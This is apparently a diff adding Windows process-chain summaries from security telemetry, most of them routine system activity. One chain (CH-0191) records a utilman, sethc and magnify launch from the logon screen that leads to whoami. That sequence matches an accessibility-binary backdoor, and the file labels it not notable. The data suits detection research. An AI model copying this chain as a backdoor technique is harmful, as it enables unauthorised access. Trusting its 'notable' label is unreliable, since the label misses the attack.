+  "max_depth": 0,
+  "n_events": 45,
+  "events_by_type": {
+   "image_load": 37,
+   "registry_event": 7,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => wmiprvse.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0186",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "mobsync.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:44:18.502000+00:00",
+  "end": "2019-05-14 23:44:18.999000+00:00",
+  "duration_s": 0.5,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 57,
+  "events_by_type": {
+   "image_load": 42,
+   "registry_event": 14,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => mobsync.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\System32\\mobsync.exe -Embedding"
+  ]
+ },
+ {
+  "chain_id": "CH-0187",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "backgroundtaskhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:44:19.422000+00:00",
+  "end": "2019-05-14 23:44:23.267000+00:00",
+  "duration_s": 3.8,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 97,
+  "events_by_type": {
+   "image_load": 76,
+   "file_create": 12,
+   "registry_event": 8,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => backgroundtaskhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca"
+  ]
+ },
+ {
+  "chain_id": "CH-0188",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "logonui.exe",
+  "root_parent": "winlogon.exe",
+  "start": "2019-05-14 23:44:20.343000+00:00",
+  "end": "2019-05-14 23:44:22.358000+00:00",
+  "duration_s": 2.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 158,
+  "events_by_type": {
+   "image_load": 110,
+   "registry_event": 46,
+   "process_create": 1,
+   "process_access": 1
+  },
+  "narrative": "winlogon.exe => logonui.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"LogonUI.exe\" /flags:0x0 /state0:0xa2df6855 /state1:0x41c64e6d"
+  ]
+ },
+ {
+  "chain_id": "CH-0189",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "taskhostw.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:44:22.364000+00:00",
+  "end": "2019-05-14 23:44:23.310000+00:00",
+  "duration_s": 0.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 25,
+  "events_by_type": {
+   "image_load": 22,
+   "registry_event": 2,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => taskhostw.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "taskhostw.exe KEYROAMING"
+  ]
+ },
+ {
+  "chain_id": "CH-0190",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "dllhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:44:22.785000+00:00",
+  "end": "2019-05-14 23:44:22.881000+00:00",
+  "duration_s": 0.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 28,
+  "events_by_type": {
+   "image_load": 27,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => dllhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\system32\\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}"
+  ]
+ },
+ {
+  "chain_id": "CH-0191",
+  "host": "HFDC01",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "utilman.exe",
+  "root_parent": "winlogon.exe",
+  "start": "2019-05-14 23:44:25.592000+00:00",
+  "end": "2019-05-14 23:45:46.046000+00:00",
+  "duration_s": 80.5,
+  "n_processes": 6,
+  "max_depth": 2,
+  "n_events": 565,
+  "events_by_type": {
+   "registry_event": 347,
+   "image_load": 200,
+   "process_access": 7,
+   "process_create": 6,
+   "file_create": 5
+  },
+  "narrative": "winlogon.exe => utilman.exe -> sethc.exe -> magnify.exe -> conhost.exe -> whoami.exe (x2)",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "utilman.exe /debug",
+   "\"C:\\Windows\\System32\\Sethc.exe\" /AccessibilitySoundAgent",
+   "\"C:\\Windows\\System32\\Magnify.exe\"  ",
+   "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"
+  ]
+ },
+ {
+  "chain_id": "CH-0192",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "vmtoolsd.exe",
+  "root_parent": "explorer.exe",
+  "start": "2019-05-14 23:44:26.055000+00:00",
+  "end": "2019-05-14 23:44:26.055000+00:00",
+  "duration_s": 0.0,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 1,
+  "events_by_type": {
+   "process_create": 1
+  },
+  "narrative": "explorer.exe => vmtoolsd.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" -n vmusr"
+  ]
+ },
+ {
+  "chain_id": "CH-0193",
+  "host": "HFDC01",
+  "user": "SHIRE\\pgustavo",
+  "root_process": "dllhost.exe",
+  "root_parent": "svchost.exe",
+  "start": "2019-05-14 23:44:35.466000+00:00",
+  "end": "2019-05-14 23:44:48.397000+00:00",
+  "duration_s": 12.9,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 41,
+  "events_by_type": {
+   "image_load": 40,
+   "process_create": 1
+  },
+  "narrative": "svchost.exe => dllhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "C:\\Windows\\SysWoW64\\DllHost.exe /Processid:{06622D85-6856-4460-8DE1-A81921B41C4B}"
+  ]
+ },
+ {
+  "chain_id": "CH-0194",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchprotocolhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:45:52.451000+00:00",
+  "end": "2019-05-14 23:47:41.681000+00:00",
+  "duration_s": 109.2,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 35,
+  "events_by_type": {
+   "image_load": 32,
+   "process_create": 1,
+   "registry_event": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchprotocolhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchProtocolHost.exe\" Global\\UsGthrFltPipeMssGthrPipe32_ Global\\UsGthrCtrlFltPipeMssGthrPipe32 1 -2147483646 \"Software\\Microsoft\\Windows Search\" \"Mozilla/4.0 (compatible; MSIE 6"
+  ]
+ },
+ {
+  "chain_id": "CH-0195",
+  "host": "HR001",
+  "user": "NT AUTHORITY\\SYSTEM",
+  "root_process": "searchfilterhost.exe",
+  "root_parent": "searchindexer.exe",
+  "start": "2019-05-14 23:45:52.585000+00:00",
+  "end": "2019-05-14 23:47:41.686000+00:00",
+  "duration_s": 109.1,
+  "n_processes": 1,
+  "max_depth": 0,
+  "n_events": 25,
+  "events_by_type": {
+   "image_load": 23,
+   "process_create": 1,
+   "process_terminate": 1
+  },
+  "narrative": "searchindexer.exe => searchfilterhost.exe",
+  "network_endpoints": [],
+  "any_encoded_cmd": false,
+  "notable": false,
+  "sample_cmdlines": [
+   "\"C:\\Windows\\system32\\SearchFilterHost.exe\" 0 768 772 780 8192 776 "
+  ]
+ }
+]
